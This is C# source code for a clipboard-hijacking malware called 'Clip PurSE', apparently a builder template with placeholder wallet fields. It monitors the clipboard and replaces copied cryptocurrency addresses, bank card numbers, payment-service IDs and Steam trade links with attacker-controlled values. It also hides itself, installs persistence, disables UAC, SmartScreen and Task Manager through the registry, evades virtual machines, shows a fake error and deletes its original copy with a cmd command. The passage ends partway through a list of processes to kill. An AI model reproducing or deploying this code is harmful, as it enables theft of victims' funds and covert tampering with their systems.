#region Dependencies

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

#endregion

#region Assembly

[assembly: SuppressIldasm]
[assembly: AssemblyTitle("[TITLE]")]
[assembly: AssemblyCompany("[COMPANY]")]
[assembly: AssemblyProduct("[PRODUCT]")]
[assembly: AssemblyCopyright("Copyright © [COPYRIGHT] 2020")]
[assembly: ComVisible(false)]
[assembly: Guid("[GUID]")]
[assembly: AssemblyVersion("[VERSION]")]
[assembly: AssemblyFileVersion("[FILEVERSION]")]

#endregion

/// <summary>
/// Clip PurSE Build created by r3xq1  
/// </summary>

namespace ClipSE
{
    internal static class Program
    {
        [STAThread]
        public static void Main()
        {
            // Проверка экземпляра программы
            if (!RunCheck.InstanceCheck()) { Environment.Exit(0); }
            new Thread(new ThreadStart(delegate () { Run(); }));
        }

        public static void Run()
        {
            Date date = new Date();
            if (date.AntiVm && AntiVM.DetectionInizialize()) // Проверка на запуск в среде Виртуальных машин (Virtual Machine)
                Environment.Exit(0);
            // Скрываем запускаемый файл
            FileControl.HideFile(GlobalPath.AssemblyPath, FileAttributes.Hidden);
            if (date.Delay) // Проверка на задержку
                Thread.Sleep(RunCheck.ThreadSleep); // Задержка перед выполнением на некоторое время
            if (date.IPloger) // Проверка на отправку данных на онлайн сервис
                Logger.GetIP(Wallets.IPLog); // Отправка уведомления на сервис IPLogger

            // Проверяем если файл запущен не из новой созданной папки
            if (!GlobalPath.StartupPath.Equals(GlobalPath.StartUpFromAppDataReserv, StringComparison.CurrentCultureIgnoreCase))
            {
                if (date.AddGarbage) // Проверка на добавления мусора в папку %AppData%\Microsoft
                    new Thread(new ThreadStart(delegate () { Garbage.InizializeTrash(500); })).Start(); // Добавляем мусорные папки (1000 шт ) в систему.
                if (date.FakeText)
                    // Уведомляем юзера ( фейк ошибка )
                    FileControl.CreateFile(string.Concat("Error.txt"), GlobalPath.MessageErrorTextForUser);

                if (date.AddInSystemRun) // Проверка на добавления в автозагрузку.
                {
                    InjReg.CopyAndShelduderInizialize(); // Добавляем в автозагрузку ( предварительно всё отчищаем и по новой добавляем )
                    RegistryControl.ToogleHidingFolders(@"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "Hidden", 2); // Изменям данные в реестре для скрытия папок в проводнике
                    ExpSetting.RefreshExplorer(); // Обновляем оболочку Explorer  

                    if (date.Uac) // Проверка на добавление отключения котроля учётных записей пользователя
                        RegistryControl.ToogleUacAdmin(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", 0); // Отключаем UAC уведомления
                    if (date.Smart) // Проверка на добавление отключения SmartScreen 
                        RegistryControl.ToogleSmartScreen(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer", "SmartScreenEnabled", "Off"); // Отключаем SmartScreen
                    if (date.TaskLock) // Проверка на добавления отключения Диспетчера Задач ( при вызове просто ничего не происходит )
                        RegistryControl.ToogleTaskMandRegedit(@"Software\Microsoft\Windows\CurrentVersion\Policies", 1); // Отключаем Диспетчер Задач
                    // Делаем видимый файл перед удалениме ( чтобы не возникло бага )
                    FileControl.HideFile(GlobalPath.AssemblyPath, FileAttributes.Normal);
                    Liquidation.Inizialize(GlobalPath.BatchFile); // Самоудаление первого файла
                    // На случай если первый не удалиться раз. ( Страховка )
                    Liquidation.SelfDelete("cmd.exe", string.Concat("/C choice /C Y /N /D Y /T 1 & Del \"", GlobalPath.GetFileName));
                }
                else
                {
                    // Делаем проверку что файл если файл не скрытый
                    if (!FileControl.IsHideOrNo())
                        // То устанавливаем ему атрибуты ( скрытый )
                        FileControl.HideFile(GlobalPath.AssemblyPath, FileAttributes.Hidden);
                    ClipChanger.StartChanger(); // Запускаем подмену буфера обмена
                }
            }
            else
            {
                // Делаем проверку что файл если файл не скрытый 
                if (!FileControl.IsHideOrNo())
                    // То устанавливаем ему аттрибуты ( скрытый )
                    FileControl.HideFile(GlobalPath.AssemblyPath, FileAttributes.Hidden);
                // Доп проверка перед запуском в отдельном потоке.
                if (!FileControl.ExistsDirectory(GlobalPath.MonickPath))
                    // new Thread(new ThreadStart(delegate () { Logger.DownMonick(GlobalPath.Server, GlobalPath.MonickPath, GlobalPath.MonickFile); })).Start();
                    ClipChanger.StartChanger(); // Запуск клиппера
            }
        }
    }

    public class Date
    {
        public bool Delay = false,
                    IPloger = false,
                    AddInSystemRun = true,
                    AddGarbage = false,
                    Uac = false,
                    Smart = false,
                    TaskLock = false,
                    AntiVm = false,
                    FakeText = true;
    }

    internal class ClipChanger
    {
        // Останавливаем клиппер
        public static void StopChanger()
        {
            ClipboardMonitor.OnClipboardChange += GetClip;
            ClipboardMonitor.Stop();
        }

        // Запускаем клиппер
        public static void StartChanger()
        {
            ClipboardMonitor.OnClipboardChange += GetClip;
            ClipboardMonitor.Start();
        }

        private static bool StartsWith(string value, string current)
        {
            try
            {
                return value.StartsWith(current, StringComparison.OrdinalIgnoreCase);
            }
            catch { return false; }
        }

        private static bool EndsWithAny(string s, params string[] stext)
        {
            foreach (string c in stext)
            {
                try
                {
                    if (s.EndsWith(c, StringComparison.OrdinalIgnoreCase)) return true;
                }
                catch (Exception) { return false; }
            }
            return false;
        }

        private static bool CheckisUpper(string text, int num)
        {
            //  return string.IsNullOrWhiteSpace(text) ? false : char.IsUpper(text[num]);
            if (string.IsNullOrWhiteSpace(text)) return false;
            if (char.IsUpper(text[num])) return true;
            return false;
        }

        // Тут проверка буфера обмена ( событие )
        public static void GetClip(Enums.ClipboardFormat clipboardFormat, object data)
        {
            try
            {
                string BufferText = ClipboardEx.GetText();
                #region Bitcoin Purse Changer

                if (!string.IsNullOrWhiteSpace(Wallets.Btc) && StartsWith(BufferText, "1") && (BufferText.Length >= 34) && BufferText.Length <= 35)
                {
                    ClipboardEx.SetClipboardText(Wallets.Btc);
                }

                #endregion

                #region Ether Purse Changer

                if (!string.IsNullOrWhiteSpace(Wallets.Eth) && StartsWith(BufferText, "0x") && !CheckisUpper(BufferText, 1) && BufferText.Length >= 42 && BufferText.Length <= 43)
                {
                    ClipboardEx.SetClipboardText(Wallets.Eth);
                }

                #endregion

                #region XRP (Ripple) Purse Changer

                if (!string.IsNullOrWhiteSpace(Wallets.Ripple) && !CheckisUpper(BufferText, 0) && StartsWith(BufferText, "r") && BufferText.Length >= 34 && BufferText.Length <= 36)
                {
                    ClipboardEx.SetClipboardText(Wallets.Ripple);
                }

                #endregion

                #region BitcoinDark Purse Changer

                if (!string.IsNullOrWhiteSpace(Wallets.Btdark) && CheckisUpper(BufferText, 0) && StartsWith(BufferText, "R") && BufferText.Length >= 33 && BufferText.Length <= 35)
                {
                    ClipboardEx.SetClipboardText(Wallets.Btdark);
                }

                #endregion

                #region Payeer Purse Changer

                if (!string.IsNullOrWhiteSpace(Wallets.Payeer) && CheckisUpper(BufferText, 0) && StartsWith(BufferText, "P") && BufferText.Length >= 11 && BufferText.Length <= 12)
                {
                    ClipboardEx.SetClipboardText(Wallets.Payeer);
                }

                #endregion

                #region BitcoinCash Purse Changer

                if (!string.IsNullOrWhiteSpace(Wallets.Bch) && !CheckisUpper(BufferText, 0) && StartsWith(BufferText, "q") && BufferText.Length >= 42 && BufferText.Length <= 43)
                {
                    ClipboardEx.SetClipboardText(Wallets.Bch);
                }

                #endregion

                #region BitcoinGold Purse Changer

                if (!string.IsNullOrWhiteSpace(Wallets.BTgold) && CheckisUpper(BufferText, 0) && StartsWith(BufferText, "G") && BufferText.Length >= 34 && BufferText.Length <= 35)
                {
                    ClipboardEx.SetClipboardText(Wallets.BTgold);
                }

                #endregion

                #region DOGEcoin Purse Changer

                if (!string.IsNullOrWhiteSpace(Wallets.Doge) && CheckisUpper(BufferText, 0) && StartsWith(BufferText, "D") && BufferText.Length >= 34 && BufferText.Length <= 35)
                {
                    ClipboardEx.SetClipboardText(Wallets.Doge);
                }

                #endregion

                #region DashCorecoin Purse Changer

                if (!string.IsNullOrWhiteSpace(Wallets.Dash) && CheckisUpper(BufferText, 0) && StartsWith(BufferText, "X") && BufferText.Length >= 34 && BufferText.Length <= 35)
                {
                    ClipboardEx.SetClipboardText(Wallets.Dash);
                }

                #endregion

                #region LiteCore Purse Changer

                if (!string.IsNullOrWhiteSpace(Wallets.Ltc) && CheckisUpper(BufferText, 0) && StartsWith(BufferText, "L") && BufferText.Length >= 34 && BufferText.Length <= 35)
                {
                    ClipboardEx.SetClipboardText(Wallets.Ltc);
                }

                #endregion

                #region Monero Purse Changer

                if (!string.IsNullOrWhiteSpace(Wallets.Xmr) && StartsWith(BufferText, "4") && BufferText.Length >= 95 && BufferText.Length <= 107)
                {
                    ClipboardEx.SetClipboardText(Wallets.Xmr);
                }

                #endregion

                #region Zcash(ZEC) Purse Changer

                if (!string.IsNullOrWhiteSpace(Wallets.Zcash) && !CheckisUpper(BufferText, 0) && StartsWith(BufferText, "t1") && BufferText.Length >= 35 && BufferText.Length <= 36)
                {
                    ClipboardEx.SetClipboardText(Wallets.Zcash);
                }

                #endregion

                #region Neo Purse Changer

                if (!string.IsNullOrWhiteSpace(Wallets.Neo) && CheckisUpper(BufferText, 0) && StartsWith(BufferText, "A") && BufferText.Length >= 34 && BufferText.Length <= 35)
                {
                    ClipboardEx.SetClipboardText(Wallets.Neo);
                }

                #endregion

                #region Iota Purse Changer

                if (!string.IsNullOrWhiteSpace(Wallets.Iota) && CheckisUpper(BufferText.ToUpper(), 0) && BufferText.Length >= 81 && BufferText.Length <= 92)
                {
                    ClipboardEx.SetClipboardText(Wallets.Iota);
                }

                #endregion

                #region Cardano Purse Changer

                if (!string.IsNullOrWhiteSpace(Wallets.Ada) && CheckisUpper(BufferText, 0) && StartsWith(BufferText, "DdzFFzCqrh") && BufferText.Length >= 104 && BufferText.Length <= 105)
                {
                    ClipboardEx.SetClipboardText(Wallets.Ada);
                }

                #endregion

                #region Lisk Purse Changer

                if (!string.IsNullOrWhiteSpace(Wallets.Lsk) && BufferText.Length >= 21 && (BufferText.Length <= 22) && EndsWithAny(BufferText, "L"))
                {
                    ClipboardEx.SetClipboardText(Wallets.Lsk);
                }

                #endregion

                #region Waves Purse Changer

                if (!string.IsNullOrWhiteSpace(Wallets.Waves) && CheckisUpper(BufferText, 1) && StartsWith(BufferText, "3P") && BufferText.Length >= 35 && BufferText.Length <= 36)
                {
                    ClipboardEx.SetClipboardText(Wallets.Waves);
                }

                #endregion

                #region Qutum Purse Changer

                if (!string.IsNullOrWhiteSpace(Wallets.Qtum) && CheckisUpper(BufferText, 0) && StartsWith(BufferText, "Q") && BufferText.Length >= 34 && BufferText.Length <= 35)
                {
                    ClipboardEx.SetClipboardText(Wallets.Qtum);
                }

                #endregion

                #region Xlm Stellar Purse Changer

                if (!string.IsNullOrWhiteSpace(Wallets.Stellar) && CheckisUpper(BufferText, 0) && StartsWith(BufferText, "G") && BufferText.Length >= 56 && BufferText.Length <= 57)
                {
                    ClipboardEx.SetClipboardText(Wallets.Stellar);
                }

                #endregion

                #region Binance Purse Changer

                if (!string.IsNullOrWhiteSpace(Wallets.Bnb) && !CheckisUpper(BufferText, 0) && StartsWith(BufferText, "bnb") && BufferText.Length >= 42 && BufferText.Length <= 43)
                {
                    ClipboardEx.SetClipboardText(Wallets.Bnb);
                }

                #endregion

                #region Tron Purse Changer

                if (!string.IsNullOrWhiteSpace(Wallets.Tron) && CheckisUpper(BufferText, 0) && StartsWith(BufferText, "T") && BufferText.Length >= 33 && BufferText.Length <= 35)
                {
                    ClipboardEx.SetClipboardText(Wallets.Tron);
                }

                #endregion

                #region EOS AccountName Changer

                if (!string.IsNullOrWhiteSpace(Wallets.Eos) && !CheckisUpper(BufferText, 0) && BufferText.Length == 12)
                {
                    ClipboardEx.SetClipboardText(Wallets.Eos);
                }

                #endregion

                #region Bytecoin Purse Changer

                if (!string.IsNullOrWhiteSpace(Wallets.Bcn) && !CheckisUpper(BufferText, 0) && StartsWith(BufferText, "bcn") && BufferText.Length >= 98 && BufferText.Length <= 99)
                {
                    ClipboardEx.SetClipboardText(Wallets.Bcn);
                }

                #endregion

                #region Via Purse Changer

                if (!string.IsNullOrWhiteSpace(Wallets.Via) && CheckisUpper(BufferText, 0) && StartsWith(BufferText, "V") && BufferText.Length >= 34 && BufferText.Length <= 35)
                {
                    ClipboardEx.SetClipboardText(Wallets.Via);
                }

                #endregion

                #region BlockNet Purse Changer

                if (!string.IsNullOrWhiteSpace(Wallets.BlockNet) && CheckisUpper(BufferText, 0) && StartsWith(BufferText, "B") && BufferText.Length >= 34 && BufferText.Length <= 35)
                {
                    ClipboardEx.SetClipboardText(Wallets.BlockNet);
                }

                #endregion

                #region BlackJack Purse Changer

                if (!string.IsNullOrWhiteSpace(Wallets.BlackJack) && StartsWith(BufferText, "9") && BufferText.Length >= 34 && BufferText.Length <= 35)
                {
                    ClipboardEx.SetClipboardText(Wallets.BlackJack);
                }

                #endregion

                #region Yandex Purse Changer

                if (!string.IsNullOrWhiteSpace(Wallets.YandexMoney) && StartsWith(BufferText, "P") != StartsWith(BufferText, "41") && BufferText.Length >= 15 && BufferText.Length <= 16)
                {
                    ClipboardEx.SetClipboardText(Wallets.YandexMoney);
                }

                #endregion

                #region Qiwi Purse Changer

                foreach (string v in new[] { "7", "+7", "79", "+8", "89", "375", "+375", "+380" })
                {
                    if (!string.IsNullOrWhiteSpace(Wallets.Qiwi) && StartsWith(BufferText, v) && BufferText.Length >= 11 && BufferText.Length <= 16)
                    {
                        ClipboardEx.SetClipboardText(Wallets.Qiwi);
                    }
                }

                #endregion

                #region DonAlert Purse Changer

                if (!string.IsNullOrWhiteSpace(Wallets.DonAlerts) && StartsWith(BufferText, "https://www.donationalerts.com/r/"))
                {
                    ClipboardEx.SetClipboardText(Wallets.DonAlerts);
                }

                #endregion

                #region DonPay Purse Changer

                if ((!string.IsNullOrWhiteSpace(Wallets.DonPay) && StartsWith(BufferText, "https://donatepay.ru/don/")) || StartsWith(BufferText, "https://donatepay.ru/donation/"))
                {
                    ClipboardEx.SetClipboardText(Wallets.DonPay);
                }

                #endregion

                #region SberBank Purse Changer

                try
                {
                    Regex RgxS = new Regex(@"\s");
                    if ((!string.IsNullOrWhiteSpace(Wallets.SberBank) && !StartsWith(BufferText, "41") && RgxS.IsMatch(BufferText) && BufferText.Length >= 19 && BufferText.Length <= 20) || (!string.IsNullOrWhiteSpace(Wallets.SberBank) && !StartsWith(BufferText, "41") && (BufferText.Length >= 16) && BufferText.Length <= 17))
                    {
                        ClipboardEx.SetClipboardText(Wallets.SberBank);
                    }
                }
                catch (Exception) { }

                #endregion

                #region SteamTradeOffer Purse Changer

                if (!string.IsNullOrWhiteSpace(Wallets.Steam) && BufferText.Contains("steamcommunity.com/tradeoffer/new/?partner="))
                {
                    ClipboardEx.SetClipboardText(Wallets.Steam);
                }

                #endregion

                #region Bitcoin Diamond Purse Changer

                if (!string.IsNullOrWhiteSpace(Wallets.BitcoinDiamond) && StartsWith(BufferText, "1J") && (BufferText.Length >= 34) && BufferText.Length <= 35)
                {
                    ClipboardEx.SetClipboardText(Wallets.BitcoinDiamond);
                }

                #endregion

                #region Decred Purse Changer

                if (!string.IsNullOrWhiteSpace(Wallets.Decred) && StartsWith(BufferText, "Ds") && (BufferText.Length >= 35) && BufferText.Length <= 36)
                {
                    ClipboardEx.SetClipboardText(Wallets.Decred);
                }

                #endregion

                #region Tezos Purse Changer

                if (!string.IsNullOrWhiteSpace(Wallets.Tezos) && !CheckisUpper(BufferText, 0) && StartsWith(BufferText, "tz1") && (BufferText.Length >= 36) && BufferText.Length <= 37)
                {
                    ClipboardEx.SetClipboardText(Wallets.Tezos);
                }

                #endregion

                #region Cosmos Purse Changer

                if ((!string.IsNullOrWhiteSpace(Wallets.Cosmos) && StartsWith(BufferText, "cosmos") && (BufferText.Length >= 45) && BufferText.Length <= 46) || (!string.IsNullOrWhiteSpace(Wallets.Cosmos) && StartsWith(BufferText, "cosmos") && (BufferText.Length >= 52) && BufferText.Length <= 53))
                {
                    ClipboardEx.SetClipboardText(Wallets.Cosmos);
                }

                #endregion

                #region SmartCash Purse Changer

                if (!string.IsNullOrWhiteSpace(Wallets.SmartCash)
                    && CheckisUpper(BufferText, 0)
                    && StartsWith(BufferText, "S")
                    && (BufferText.Length >= 34)
                    && BufferText.Length <= 35)
                {
                    ClipboardEx.SetClipboardText(Wallets.SmartCash);
                }

                #endregion

                #region WebMoney Purse Changer

                if (!Regex.IsMatch(BufferText, @"\w{1}\d{12}")) return;

                switch (BufferText[0])
                {
                    case 'R':
                        if (!string.IsNullOrWhiteSpace(Wallets.WebMoney_WMR))
                        {
                            ClipboardEx.SetClipboardText(Wallets.WebMoney_WMR);
                        }
                        break;

                    case 'Z':
                        if (!string.IsNullOrWhiteSpace(Wallets.WebMoney_WMZ))
                        {
                            ClipboardEx.SetClipboardText(Wallets.WebMoney_WMZ);
                        }
                        break;

                    case 'U':
                        if (!string.IsNullOrWhiteSpace(Wallets.WebMoney_WMU))
                        {
                            ClipboardEx.SetClipboardText(Wallets.WebMoney_WMU);
                        }
                        break;
                }

                #endregion
            }
            catch (Exception) { }
        }
    }

    public static class Wallets
    {
        public static string Btc = "[BTC]", Eth = "[ETH]",
            Bch = "[BCH]", BTgold = "[BTGOLD]", Bcn = "[BCN]",
            Dash = "[DASH]", Ltc = "[LTC]", Lsk = "[LISK]",
            Zcash = "[ZCASH]", Payeer = "[PAYEER]", Btdark = "[BTDARK]",
            IPLog = "[WEB]",
            BlackJack = "[BJack]",
            Xmr = "[XMR]",
            YandexMoney = "[YANDEXMONEY]",
            DonAlerts = "[DONATE]",
            DonPay = "[DONATEPAY]",
            Doge = "[DOGE]",
            Neo = "[NEO]",
            Iota = "[IOTA]",
            Tron = "[TRON]",
            Bnb = "[BNB]",
            Ripple = "[RIPPLE]",
            Qiwi = "[QIWI]",
            Qtum = "[QTUM]",
            Stellar = "[STELLAR]",
            Steam = "[STEAM]",
            Eos = "[EOS]",
            Ada = "[ADA]",
            Via = "[VIA]",
            Waves = "[WAVES]",
            BlockNet = "[BN]",
            SberBank = "[SBER]",
            BitcoinDiamond = "[BITDAIMON]",
            Decred = "[DECRED]",
            Tezos = "[TEZOS]",
            Cosmos = "[COSMOS]",
            SmartCash = "[SMARTCASH]",
            WebMoney_WMR = "[WEBWMR]",
            WebMoney_WMZ = "[WEBWMZ]",
            WebMoney_WMU = "[WEBWMU]";
    }

    public static class ExpSetting
    {
        public static void RefreshExplorer()
        {
            IntPtr explorer = NativeMethods.FindWindow("Progman", "Program Manager");
            explorer = NativeMethods.FindWindowEx(explorer, IntPtr.Zero, "SHELLDLL_DefView", null);
            explorer = NativeMethods.FindWindowEx(explorer, IntPtr.Zero, "SysListView32", null);
            NativeMethods.PostMessage(explorer, 0x100, new IntPtr(0x74), IntPtr.Zero);
            NativeMethods.PostMessage(explorer, 0x101, new IntPtr(0x74), new IntPtr(1 << 31));
        }
    }

    public static partial class ClipboardMonitor
    {
        private class ClipboardWatcher : Form
        {
            public static event OnClipboardChangeEventHandler OnClipboardChange;
            protected static ClipboardWatcher mInstance;

            public static void Start()
            {
                if (mInstance == null)
                {
                    var thread = new Thread(delegate (object x) { Application.Run(new ClipboardWatcher()); });
                    thread.SetApartmentState(ApartmentState.STA);
                    thread.Start();
                }
            }

            public static void Stop()
            {
                try
                {
                    mInstance.Invoke(new MethodInvoker(delegate ()
                    {
                        NativeMethods.ChangeClipboardChain(mInstance.Handle, nextClipboardViewer);
                    }));
                    mInstance.Invoke(new MethodInvoker(mInstance.Close));
                    mInstance.Dispose();
                    mInstance = null;
                }
                catch (Exception) { }
            }

            protected override void SetVisibleCore(bool value)
            {
                CreateHandle();
                mInstance = this;
                nextClipboardViewer = NativeMethods.SetClipboardViewer(mInstance.Handle);
                base.SetVisibleCore(false);
            }

            protected override void WndProc(ref Message m)
            {
                switch (m.Msg)
                {
                    case WM_DRAWCLIPBOARD:
                        ClipChanged();
                        NativeMethods.SendMessage(nextClipboardViewer, m.Msg, m.WParam, m.LParam);
                        break;
                    default:
                        switch (m.Msg)
                        {
                            case WM_CHANGECBCHAIN:
                                if (m.WParam != nextClipboardViewer)
                                    NativeMethods.SendMessage(nextClipboardViewer, m.Msg, m.WParam, m.LParam);
                                else nextClipboardViewer = m.LParam; break;
                            default: base.WndProc(ref m); break;
                        }
                        break;
                }
            }

            private void ClipChanged()
            {
                IDataObject dataObject = Clipboard.GetDataObject();
                Enums.ClipboardFormat? clipboardFormat = null;
                foreach (string text in Enum.GetNames(typeof(Enums.ClipboardFormat)))
                {
                    if (dataObject.GetDataPresent(text))
                    {
                        clipboardFormat = new Enums.ClipboardFormat?((Enums.ClipboardFormat)Enum.Parse(typeof(Enums.ClipboardFormat), text));
                        break;
                    }
                    continue;
                }
                object data = dataObject.GetData(clipboardFormat.ToString());
                if (data == null || clipboardFormat == null) return;

                OnClipboardChange.Invoke(clipboardFormat.Value, data);
            }

            private static IntPtr nextClipboardViewer;
            private const int WM_DRAWCLIPBOARD = 776, WM_CHANGECBCHAIN = 781;

            public ClipboardWatcher() { }

            internal delegate void OnClipboardChangeEventHandler(Enums.ClipboardFormat format, object data);
        }
    }

    public static partial class ClipboardMonitor
    {
        internal static event OnClipboardChangeEventHandler OnClipboardChange;

        public static void Start()
        {
            ClipboardWatcher.Start();
            ClipboardWatcher.OnClipboardChange += delegate (Enums.ClipboardFormat clipboardFormat, object data)
            {
                OnClipboardChange?.Invoke(clipboardFormat, data);
            };
        }

        public static void Stop()
        {
            OnClipboardChange = null;
            ClipboardWatcher.Stop();
        }

        internal delegate void OnClipboardChangeEventHandler(Enums.ClipboardFormat clipboardFormat, object data);
    }

    public static class Enums
    {
        public enum ClipboardFormat : byte
        {
            Text,
            UnicodeText
        }
    }

    internal static class ClipboardEx
    {
        private const uint CF_UNICODETEXT = 0xD; // 13
        private const int UF = 1;

        public static string GetText()
        {
            if (NativeMethods.IsClipboardFormatAvailable(CF_UNICODETEXT) && NativeMethods.OpenClipboard(IntPtr.Zero))
            {
                string data = null;
                IntPtr hGlobal = NativeMethods.GetClipboardData(CF_UNICODETEXT);
                if (!hGlobal.Equals(IntPtr.Zero))
                {
                    IntPtr lpwcstr = NativeMethods.GlobalLock(hGlobal);
                    if (!lpwcstr.Equals(IntPtr.Zero))
                    {
                        try
                        {
                            data = Marshal.PtrToStringUni(lpwcstr);
                            NativeMethods.GlobalUnlock(lpwcstr);
                        }
                        catch { }
                    }
                }
                NativeMethods.CloseClipboard();
                return data;
            }
            return null;
        }

        public static bool SetText(string text) // Старая вариация
        {
            if (NativeMethods.GetOpenClipboardWindow() != null)
            {
                NativeMethods.OpenClipboard(IntPtr.Zero);
                NativeMethods.CloseClipboard();
                Clipboard.SetText(text);
            }
            else
            {
                Clipboard.SetText(text);
            }
            return true;
        }

        public static bool SetClipboardText(string Text) // новая вариация ( используйте этот пример )
        {
            IntPtr ipGlobal = Marshal.StringToHGlobalAnsi(Text);
            if (!ipGlobal.Equals(IntPtr.Zero) && NativeMethods.OpenClipboard(IntPtr.Zero))
            {
                NativeMethods.EmptyClipboard();
                if (!(NativeMethods.SetClipboardData(UF, ipGlobal) != IntPtr.Zero))
                    Marshal.FreeHGlobal(ipGlobal);

                NativeMethods.CloseClipboard();
                return true;
            }
            return false;
        }
    }

    internal static class NativeMethods
    {
        #region For ClipBoard GetText

        [DllImport("user32.dll")]
        internal static extern IntPtr GetClipboardData(uint uFormat);

        [DllImport("user32.dll")]
        public static extern bool IsClipboardFormatAvailable(uint format);

        [DllImport("user32.dll", SetLastError = true)]
        internal static extern bool OpenClipboard(IntPtr hWndNewOwner);

        [DllImport("user32.dll", SetLastError = true)]
        internal static extern bool CloseClipboard();

        [DllImport("user32.dll")]
        internal static extern bool EmptyClipboard();

        [DllImport("kernel32.dll")]
        internal static extern IntPtr GlobalLock(IntPtr hMem);

        [DllImport("kernel32.dll")]
        internal static extern bool GlobalUnlock(IntPtr hMem);

        #endregion

        #region For ClipBoard SetText

        [DllImport("user32.dll")]
        public static extern IntPtr GetOpenClipboardWindow();

        [DllImport("user32.dll")]
        public static extern IntPtr SetClipboardData(uint uFormat, IntPtr hMem);

        #endregion

        #region For ClipMonitor

        [DllImport("User32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr SetClipboardViewer(IntPtr hWndNewViewer);

        [DllImport("User32.dll", CharSet = CharSet.Auto)]
        public static extern bool ChangeClipboardChain(IntPtr hWndRemove, IntPtr hWndNewNext);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr SendMessage(IntPtr hwnd, int wMsg, IntPtr wParam, IntPtr lParam);

        #endregion

        #region For Refresh WinExplorer

        [DllImport("user32")]
        public static extern int PostMessage(IntPtr hwnd, int msg, IntPtr wParam, IntPtr lParam);

        [DllImport("user32", CharSet = CharSet.Unicode)]
        public static extern IntPtr FindWindow(string className, string caption);

        [DllImport("user32", CharSet = CharSet.Unicode)]
        public static extern IntPtr FindWindowEx(IntPtr parent, IntPtr startChild, string className, string caption);


        #endregion

        #region For AntiVM

        [DllImport("kernel32.dll", BestFitMapping = false, CharSet = CharSet.Unicode)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        #endregion
    }

    public static class FileControl
    {
        public static bool ExistsFile(string path) { if (File.Exists(path)) { return true; } return false; }
        public static bool ExistsDirectory(string path) { if (Directory.Exists(path)) { return true; } return false; }
        public static bool ExistsFileAndDirectory(string pathdir, string pathfile) { if (Directory.Exists(pathdir) || File.Exists(pathfile)) { return true; } return false; }
        public static string CombinePath(params string[] paths)
        {
            try
            {
                if (paths != null) { return Path.Combine(paths); }
                return string.Empty;
            }
            catch { return string.Empty; }
        }
        public static string GetFileName(string path)
        {
            try
            {
                return Path.GetFileName(path);
            }
            catch { return string.Empty; }
        }
        public static string GetDirName(string path)
        {
            try
            {
                return Path.GetDirectoryName(path);
            }
            catch { return string.Empty; }
        }
        public static string GetFileWithoutEx(string path)
        {
            try
            {
                return Path.GetFileNameWithoutExtension(path);
            }
            catch { return string.Empty; }
        }
        public static bool CreateDirectory(string path)
        {
            try
            {
                DirectoryInfo dir = new DirectoryInfo(path);
                dir.Create(); dir.Refresh(); dir.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
                return true;
            }
            catch (Exception) { return false; }
        }
        public static bool ExtractingBinFiles(string path, byte[] resource)
        {
            try
            {
                File.WriteAllBytes(path, resource);
                return true;
            }
            catch { return false; }
        }
        public static bool CopyFile(string source, string destfile, bool overwrite)
        {
            try
            {
                File.Copy(source, destfile, overwrite); return true;
            }
            catch (Exception) { return false; }
        }
        public static bool CreateFile(string path, string content)
        {
            try
            {
                File.WriteAllText(path, content); return true;
            }
            catch (Exception) { return false; }
        }
        public static bool DirectoryDelete(string pathdir)
        {
            if (ExistsDirectory(pathdir))
            {
                try
                {
                    Directory.Delete(pathdir, true); return true;
                }
                catch (Exception) { return false; }
            }
            return false;
        }
        public static void HideFile(string path, FileAttributes attributes)
        { try { File.SetAttributes(path, attributes); } catch (Exception) { } }
        public static bool IsHideOrNo()
        {
            try
            {
                if (File.GetAttributes(GlobalPath.AssemblyPath).HasFlag(FileAttributes.Hidden))
                {
                    return true;
                }
                return false;
            }
            catch { return false; }
        }
    }

    public static class GlobalPath
    {
        public static readonly string GetFileName = FileControl.GetFileName(AppDomain.CurrentDomain.FriendlyName); // ClipPurSE.exe
        public static readonly string GenRunNameWithoutExtension = FileControl.GetFileWithoutEx(AppDomain.CurrentDomain.FriendlyName); // ClipPurSE
        public static readonly string AssemblyPath = Assembly.GetExecutingAssembly().Location; // E:\Project\ClipPurSE\ClipPurSE\bin\Release\ClipPurSE.exe
        public static readonly string StartupPath = FileControl.GetDirName(AssemblyPath); // E:\Project\ClipPurSE\ClipPurSE\bin\Release
        public static readonly string AppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData); // C:\Users\Admin\AppData\Roaming
        public static readonly string BatchFile = FileControl.CombinePath(Environment.CurrentDirectory, "Self.bat");
        public static readonly string Microsoft = FileControl.CombinePath(AppData, "Microsoft"); // C:\Users\Admin\AppData\Roaming\Microsoft
        public static readonly string StartUpFromAppDataReserv = FileControl.CombinePath(AppData, @"Microsoft\SecureData"); // C:\Users\Admin\AppData\Roaming\Microsoft\SecureData
        public static readonly string MonickPath = FileControl.CombinePath(AppData, "LogsSys");
        public static readonly string MonickFile = FileControl.CombinePath(MonickPath, "dllhost.exe");
        public static string MessageErrorTextForUser = "[TEXT_ERROR]";
    }

    public static class ProcessControl
    {
        public static bool RunFile(string filename)
        {
            if (!string.IsNullOrWhiteSpace(filename))
            {
                try
                {
                    ProcessWindowStyle PwsHide = ProcessWindowStyle.Hidden;
                    ProcessStartInfo startInfo = new ProcessStartInfo
                    {
                        FileName = filename,
                        CreateNoWindow = false,
                        WindowStyle = PwsHide
                    };
                    using (Process info = Process.Start(startInfo)) { info.Refresh(); }
                    return true;
                }
                catch (Exception) { return false; }
            }
            return true;
        }

        public static void KillClipInizialize()
        {
            try
            {
                Process currentProcess = Process.GetCurrentProcess();
                foreach (string list in ListClipManagers)
                {
                    foreach (Process process in Process.GetProcessesByName(list))
                    {
                        try
                        {
                            if (process.ProcessName.ToLower().Contains(list.ToLower()) && process.ProcessName != currentProcess.ProcessName)
                            {
                                try
                                {
                                    process.CloseMainWindow();
                                }
                                catch { }
                            }
                        }
                        catch { continue; }
                    }
                }
            }
            catch { }
        }

        private static readonly List<string> ListClipManagers = new List<string>
        {
